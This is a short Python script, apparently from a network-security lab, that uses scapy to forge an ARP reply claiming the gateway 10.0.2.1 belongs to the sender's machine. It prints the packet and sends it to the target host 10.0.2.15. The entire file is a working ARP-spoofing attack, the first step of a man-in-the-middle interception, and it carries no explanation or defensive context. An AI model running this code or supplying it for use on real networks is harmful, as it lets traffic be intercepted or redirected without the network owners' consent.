#!/usr/bin/env python

import scapy.all as scapy

target_ip="10.0.2.15"
target_mac="08:00:27:31:de:a3"
gateway_ip = "10.0.2.1"

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip )
print(packet.show())
print(packet.summary())
scapy.send(packet)